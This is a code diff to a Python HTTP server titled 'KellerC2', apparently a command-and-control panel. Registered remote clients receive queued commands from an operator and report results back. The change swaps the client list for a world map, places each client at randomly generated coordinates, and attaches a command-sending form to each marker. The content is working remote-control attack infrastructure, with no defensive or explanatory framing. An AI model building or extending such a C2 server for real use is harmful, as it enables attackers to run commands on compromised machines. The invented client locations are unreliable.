@@ -3,45 +3,69 @@ from http.server import HTTPServer, ThreadingHTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 import json
 import queue
+import random
+
 
 INDEX_PAGE = """
 <html>
 <head>
     <title>KellerC2</title>
+    <link rel=\"stylesheet\" href=\"https://unpkg.com/leaflet@1.9.4/dist/leaflet.css\" />
+    <style>
+      html, body { height: 100%; margin: 0; }
+      #map { height: 100%; }
+    </style>
+    <script src=\"https://unpkg.com/leaflet@1.9.4/dist/leaflet.js\"></script>
     <script>
+    let map;
+    let markers = {};
     async function load() {
         const res = await fetch('/clients');
         const clients = await res.json();
-        const list = document.getElementById('clients');
-        list.innerHTML = '';
-        clients.forEach(id => {
-            const item = document.createElement('li');
-            item.innerHTML = id + ` <form onsubmit="sendCmd(event, this, '${id}')">
-                <input name="cmd" placeholder="Command" />
-                <button type="submit">Send</button>
-                </form><pre id="res_${id}"></pre>`;
-            list.appendChild(item);
-            fetchResult(id);
+        clients.forEach(c => {
+            if (!markers[c.id]) {
+                const m = L.marker([c.lat, c.lon]).addTo(map);
+                m.bindPopup(`<b>${c.id}</b><br>
+                    <form onsubmit=\"sendCmd(event,this,'${c.id}')\">
+                    <input name=cmd placeholder=Command />
+                    <button type=submit>Send</button>
+                    </form><pre id=res_${c.id}></pre>`);
+                markers[c.id] = m;
+            }
+            fetchResult(c.id);
         });
     }
+
     async function sendCmd(e, form, id) {
         e.preventDefault();
         const cmd = form.cmd.value;
-        await fetch('/send', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({client_id:id, command:cmd})});
+        await fetch('/send', {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({client_id:id, command:cmd})
+        });
         form.cmd.value='';
     }
-    async function fetchResult(id){
+
+    async function fetchResult(id) {
         const r = await fetch('/result?client_id='+id);
         const data = await r.json();
-        document.getElementById('res_'+id).textContent = data.result || '';
+        const pre = document.getElementById('res_'+id);
+        if (pre) pre.textContent = data.result || '';
     }
-    setInterval(load, 5000);
-    window.onload = load;
+
+    window.onload = () => {
+        map = L.map('map').setView([20,0], 2);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
+        load();
+        setInterval(load, 5000);
+    };
     </script>
 </head>
 <body>
-    <h1>Connected clients</h1>
-    <ul id="clients"></ul>
+    <div id=\"map\"></div>
 </body>
 </html>
 """
@@ -49,6 +73,7 @@ INDEX_PAGE = """
 clients = set()
 client_queues = {}
 client_results = {}
+client_locations = {}
 
 class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
@@ -65,6 +90,10 @@ class Handler(BaseHTTPRequestHandler):
                 clients.add(client_id)
                 client_queues.setdefault(client_id, queue.Queue())
                 client_results.setdefault(client_id, '')
+                client_locations.setdefault(client_id, (
+                    random.uniform(-60, 60),
+                    random.uniform(-180, 180)
+                ))
                 body = b'Registered'
                 self.send_response(200)
                 self.send_header('Content-Length', str(len(body)))
@@ -123,7 +152,14 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         parsed = urlparse(self.path)
         if parsed.path == '/clients':
-            body = json.dumps(sorted(list(clients))).encode()
+            body = json.dumps([
+                {
+                    'id': cid,
+                    'lat': client_locations.get(cid, (0, 0))[0],
+                    'lon': client_locations.get(cid, (0, 0))[1]
+                }
+                for cid in sorted(clients)
+            ]).encode()
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.send_header('Content-Length', str(len(body)))
